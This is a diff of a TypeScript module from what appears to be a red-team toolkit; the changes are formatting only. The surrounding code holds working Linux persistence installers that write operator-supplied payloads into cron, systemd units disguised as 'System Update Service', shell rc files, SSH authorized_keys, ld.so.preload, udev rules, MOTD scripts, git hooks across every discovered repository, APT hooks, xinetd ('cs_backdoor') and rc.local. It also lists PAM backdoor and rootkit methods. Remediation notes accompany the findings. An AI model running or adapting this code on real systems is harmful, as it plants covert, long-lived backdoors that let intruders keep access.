@@ -26,7 +26,9 @@ echo ""
 echo "--- /etc/crontab ---"
 cat /etc/crontab 2>/dev/null
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Cron Persistence ---"
 if [ -w /etc/cron.d/ ]; then
   echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
@@ -35,8 +37,10 @@ elif command -v crontab >/dev/null 2>&1; then
 else
   echo "[-] No writable cron location found"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -51,7 +55,8 @@ fi
       resource: "cron",
       title: "Cron persistence installed",
       details: `Cron job persistence established with schedule: ${schedule}`,
-      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
+      remediation:
+        "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
     })
   }
 
@@ -89,17 +94,25 @@ else
 fi
 echo ""
 echo "--- Existing Custom Services ---"
-${userLevel ? `
+${
+  userLevel
+    ? `
 ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
 systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
-` : `
+`
+    : `
 find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
 systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
-`}
+`
+}
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Systemd Persistence ---"
-${userLevel ? `
+${
+  userLevel
+    ? `
 mkdir -p ~/.config/systemd/user 2>/dev/null
 cat > ~/.config/systemd/user/${name}.service << 'UNIT'
 [Unit]
@@ -118,7 +131,8 @@ UNIT
 systemctl --user daemon-reload 2>/dev/null
 systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
 systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
-` : `
+`
+    : `
 cat > /etc/systemd/system/${name}.service << 'UNIT'
 [Unit]
 Description=System Update Service
@@ -136,9 +150,12 @@ UNIT
 systemctl daemon-reload 2>/dev/null
 systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
 systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
-`}
-` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
-`}
+`
+}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -188,7 +205,9 @@ for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
   fi
 done
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Bashrc Persistence ---"
 target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
 for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
@@ -200,8 +219,10 @@ for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
     break
   fi
 done
-` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -217,7 +238,8 @@ done
       resource: "shell_rc",
       title: "Writable shell RC files found",
       details: `${writableRcs} writable shell RC file(s) available for persistence injection`,
-      remediation: "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
+      remediation:
+        "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
     })
   }
 
@@ -259,15 +281,19 @@ echo ""
 echo "--- SSHD Config ---"
 grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)" /etc/ssh/sshd_config 2>/dev/null
 echo ""
-${pubkey ? `
+${
+  pubkey
+    ? `
 echo "--- Installing SSH Key Persistence ---"
 target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
 mkdir -p "$target_dir/.ssh" 2>/dev/null
 chmod 700 "$target_dir/.ssh" 2>/dev/null
 echo "${pubkey}" >> "$target_dir/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key added to $target_dir/.ssh/authorized_keys" || echo "[-] Failed to write authorized_keys"
 chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
-` : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
-`}
+`
+    : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -282,7 +308,8 @@ chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
       resource: "ssh_authorized_keys",
       title: "SSH authorized_keys persistence installed",
       details: "SSH public key added to authorized_keys — passwordless SSH access established",
-      remediation: "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
+      remediation:
+        "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
     })
   }
 
@@ -328,16 +355,20 @@ echo ""
 echo "--- Shared library cache ---"
 ldconfig -p 2>/dev/null | wc -l
 echo ""
-${libPath ? `
+${
+  libPath
+    ? `
 echo "--- Installing ld.so.preload Persistence ---"
 if [ "$(id -u)" = "0" ]; then
   echo "${libPath}" >> /etc/ld.so.preload && echo "[+] Library added to /etc/ld.so.preload: ${libPath}" || echo "[-] Failed to write /etc/ld.so.preload"
 else
   echo "[-] Root required for /etc/ld.so.preload modification"
 fi
-` : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
+`
+    : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
 echo "[*] WARNING: Every dynamically linked process will load this library"
-`}
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -392,7 +423,9 @@ echo ""
 echo "--- Run Level Links ---"
 ls /etc/rc*.d/ 2>/dev/null | head -20
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing SysV Init Persistence ---"
 cat > /etc/init.d/${name} << 'INITSCRIPT'
 #!/bin/sh
@@ -418,8 +451,10 @@ elif command -v chkconfig >/dev/null 2>&1; then
 else
   echo "[+] Init script written but could not auto-link. Manually run: ln -s /etc/init.d/${name} /etc/rc2.d/S99${name}"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -459,14 +494,18 @@ echo "--- /etc/at.allow and /etc/at.deny ---"
 cat /etc/at.allow 2>/dev/null && echo "[*] at.allow exists" || echo "[-] No at.allow"
 cat /etc/at.deny 2>/dev/null && echo "[*] at.deny exists" || echo "[-] No at.deny"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing at Job ---"
 echo "${payload}" | at ${time} 2>&1 && echo "[+] at job scheduled for: ${time}" || echo "[-] Failed to schedule at job"
 echo ""
 echo "--- Updated Queue ---"
 atq 2>/dev/null
-` : `echo "[*] Dry run — pass --payload <cmd> --time <timespec> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --time <timespec> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -492,7 +531,7 @@ export async function udevRulesPersist(args: string[], timeout: number): Promise
   const findings: Finding[] = []
   const output: string[] = ["=== Udev Rules Persistence ==="]
   const payload = argVal(args, "--payload")
-  const trigger = argVal(args, "--trigger") || 'add'
+  const trigger = argVal(args, "--trigger") || "add"
 
   const script = `
 echo "--- Udev Rules Directories ---"
@@ -502,7 +541,9 @@ echo ""
 echo "--- Udev Status ---"
 udevadm info --version 2>/dev/null || echo "[-] udevadm not available"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Udev Rule ---"
 if [ -w /etc/udev/rules.d/ ] || [ "$(id -u)" = "0" ]; then
   echo 'ACTION=="${trigger}", RUN+="${payload}"' > /etc/udev/rules.d/99-cs-persist.rules 2>/dev/null
@@ -511,8 +552,10 @@ if [ -w /etc/udev/rules.d/ ] || [ "$(id -u)" = "0" ]; then
 else
   echo "[-] Root required to write udev rules"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> --trigger <action> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --trigger <action> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -579,7 +622,8 @@ echo "  4. Modify pam_unix.so source and recompile with backdoor password"
       resource: "pam",
       title: "PAM authentication modules enumerated",
       details: "PAM configuration and module locations identified — backdoor installation paths mapped",
-      remediation: "Monitor PAM module integrity with AIDE/Tripwire. Hash-check pam_unix.so against distribution packages.",
+      remediation:
+        "Monitor PAM module integrity with AIDE/Tripwire. Hash-check pam_unix.so against distribution packages.",
     })
   }
 
@@ -591,7 +635,8 @@ echo "  4. Modify pam_unix.so source and recompile with backdoor password"
     resource: "pam",
     title: "PAM backdoor vectors identified",
     details: "PAM modules can be patched or replaced to accept a master password — extremely persistent and stealthy",
-    remediation: "Use package manager to verify PAM module integrity (dpkg --verify libpam-modules / rpm -V pam). Monitor /etc/pam.d/ for changes.",
+    remediation:
+      "Use package manager to verify PAM module integrity (dpkg --verify libpam-modules / rpm -V pam). Monitor /etc/pam.d/ for changes.",
   })
 
   return { output: output.join("\n"), findings }
@@ -610,7 +655,9 @@ echo ""
 echo "--- MOTD Directory Permissions ---"
 stat /etc/update-motd.d/ 2>/dev/null | grep -i "access"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing MOTD Persistence ---"
 if [ "$(id -u)" = "0" ] || [ -w /etc/update-motd.d/ ]; then
   printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > /etc/update-motd.d/${name} 2>/dev/null
@@ -619,8 +666,10 @@ if [ "$(id -u)" = "0" ] || [ -w /etc/update-motd.d/ ]; then
 else
   echo "[-] Cannot write to /etc/update-motd.d/ — root required"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -660,7 +709,9 @@ for d in /etc/xdg/autostart ~/.config/autostart; do
   fi
 done
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing XDG Autostart ---"
 target_dir="$HOME/.config/autostart"
 if [ "$(id -u)" = "0" ] && [ -d /etc/xdg/autostart ]; then
@@ -677,8 +728,10 @@ NoDisplay=true
 X-GNOME-Autostart-enabled=true
 DESKTOP
 echo "[+] XDG autostart entry created: $target_dir/${name}.desktop"
-` : `echo "[*] Dry run — pass --payload <cmd> --name <entry-name> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --name <entry-name> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -719,7 +772,9 @@ find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | w
   done
 done
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Git Hook Persistence ---"
 installed=0
 find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
@@ -735,8 +790,10 @@ find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | w
     done
   fi
 done
-` : `echo "[*] Dry run — pass --payload <cmd> to install hooks in discovered repositories."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install hooks in discovered repositories."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -800,8 +857,10 @@ echo "  3. Use modprobe.d/install directive to run commands on module load"
       status: "IDENTIFIED",
       resource: "kernel_modules",
       title: "Kernel headers available for module compilation",
-      details: "Kernel headers installed — custom kernel modules can be compiled and loaded for rootkit-level persistence",
-      remediation: "Remove kernel headers (linux-headers-*) on production systems if not needed. Monitor module loading with auditd.",
+      details:
+        "Kernel headers installed — custom kernel modules can be compiled and loaded for rootkit-level persistence",
+      remediation:
+        "Remove kernel headers (linux-headers-*) on production systems if not needed. Monitor module loading with auditd.",
     })
   }
 
@@ -834,7 +893,9 @@ echo ""
 echo "--- Existing Hook Files ---"
 grep -rn "DPkg::Pre-Invoke\|DPkg::Post-Invoke\|APT::Update::Pre-Invoke\|APT::Update::Post-Invoke" /etc/apt/apt.conf.d/ 2>/dev/null
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing APT Hook ---"
 if [ "$(id -u)" = "0" ] || [ -w /etc/apt/apt.conf.d/ ]; then
   echo 'DPkg::Post-Invoke {"${payload} &>/dev/null &";};' > /etc/apt/apt.conf.d/99cs-update 2>/dev/null
@@ -842,8 +903,10 @@ if [ "$(id -u)" = "0" ] || [ -w /etc/apt/apt.conf.d/ ]; then
 else
   echo "[-] Root required to write to /etc/apt/apt.conf.d/"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -885,13 +948,17 @@ echo "[*] DPKG trigger persistence methods:"
 echo "  1. Add payload to an existing package's .postinst script"
 echo "  2. Register interest in /var/lib/dpkg/triggers/File for a common path"
 echo "  3. Create a fake package with dpkg-deb containing persistence hooks"
-${payload ? `
+${
+  payload
+    ? `
 echo ""
 echo "--- Checking writable postinst scripts ---"
 find /var/lib/dpkg/info/ -name "*.postinst" -writable 2>/dev/null | head -5 | while read f; do
   echo "[+] Writable postinst: $f"
 done
-` : ""}
+`
+    : ""
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -924,7 +991,9 @@ export async function socketActivation(args: string[], timeout: number): Promise
 echo "--- Existing Socket Units ---"
 systemctl list-sockets --no-pager 2>/dev/null || echo "[-] systemd not available"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing Socket Activation ---"
 if [ "$(id -u)" = "0" ]; then
   cat > /etc/systemd/system/cs-sock.socket << 'SOCKUNIT'
@@ -956,8 +1025,10 @@ SVCUNIT
 else
   echo "[-] Root required for system socket activation"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -992,7 +1063,9 @@ echo ""
 echo "--- User Services ---"
 systemctl --user list-units --type=service --no-pager 2>/dev/null | head -15 || echo "[-] systemctl --user not available"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing User Service ---"
 mkdir -p ~/.config/systemd/user 2>/dev/null
 cat > ~/.config/systemd/user/${name}.service << 'USRSVC'
@@ -1011,8 +1084,10 @@ USRSVC
 systemctl --user daemon-reload 2>/dev/null
 systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}" || echo "[-] Failed to enable"
 systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start"
-` : `echo "[*] Dry run — pass --payload <cmd> --name <svc> to install. No root needed."
-`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --name <svc> to install. No root needed."
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -1048,7 +1123,9 @@ echo ""
 echo "--- /etc/xinetd.d/ ---"
 ls -la /etc/xinetd.d/ 2>/dev/null
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing xinetd persistence ---"
 if [ -d /etc/xinetd.d/ ] && [ -w /etc/xinetd.d/ ]; then
   cat > /etc/xinetd.d/cs_backdoor << 'XINET'
@@ -1070,7 +1147,9 @@ XINET
 else
   echo "[-] Cannot write to /etc/xinetd.d/"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install"`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install"`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -1106,7 +1185,9 @@ echo ""
 echo "--- rc-local.service ---"
 systemctl status rc-local 2>/dev/null | grep -E "Active:|Loaded:"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing rc.local persistence ---"
 if [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
   sed -i "/^exit 0/i ${payload} &" /etc/rc.local 2>/dev/null && echo "[+] Payload injected before 'exit 0'" || echo "[-] Failed to inject"
@@ -1119,7 +1200,9 @@ elif [ -w /etc/ ]; then
 else
   echo "[-] Cannot create/modify /etc/rc.local"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install"`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -1159,7 +1242,9 @@ echo ""
 echo "--- logrotate schedule ---"
 grep -r logrotate /etc/cron.daily/ /etc/crontab /etc/cron.d/ 2>/dev/null | head -5
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing logrotate persistence ---"
 if [ -w /etc/logrotate.d/ ]; then
   cat > /etc/logrotate.d/cs_persist << 'LR'
@@ -1177,7 +1262,9 @@ LR
 else
   echo "[-] Cannot write to /etc/logrotate.d/"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install"`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -1215,7 +1302,9 @@ echo "--- /etc/ssh/sshrc writability ---"
 [ -w /etc/ssh/sshrc ] 2>/dev/null && echo "[+] /etc/ssh/sshrc is writable"
 [ ! -f /etc/ssh/sshrc ] && [ -w /etc/ssh/ ] && echo "[+] /etc/ssh/ is writable — can create sshrc"
 echo ""
-${payload ? `
+${
+  payload
+    ? `
 echo "--- Installing SSH RC persistence ---"
 if [ -w /etc/ssh/ ]; then
   echo "#!/bin/bash" > /etc/ssh/sshrc 2>/dev/null
@@ -1228,7 +1317,9 @@ elif [ -w "$HOME/.ssh/" ]; then
 else
   echo "[-] Cannot install SSH RC persistence"
 fi
-` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
+`
+    : `echo "[*] Dry run — pass --payload <cmd> to install"`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -1265,7 +1356,9 @@ echo ""
 echo "--- /etc/ld.so.conf.d/ writability ---"
 [ -w /etc/ld.so.conf.d/ ] && echo "[+] /etc/ld.so.conf.d/ is writable" || echo "[-] /etc/ld.so.conf.d/ is not writable"
 echo ""
-${libpath ? `
+${
+  libpath
+    ? `
 echo "--- Installing ld.so.conf.d persistence ---"
 if [ -w /etc/ld.so.conf.d/ ]; then
   echo "${libpath}" > /etc/ld.so.conf.d/cs_persist.conf
@@ -1274,7 +1367,9 @@ if [ -w /etc/ld.so.conf.d/ ]; then
 else
   echo "[-] Cannot write to /etc/ld.so.conf.d/"
 fi
-` : `echo "[*] Dry run — pass --lib-path <dir> to add a library path to ld.so.conf.d/"`}
+`
+    : `echo "[*] Dry run — pass --lib-path <dir> to add a library path to ld.so.conf.d/"`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
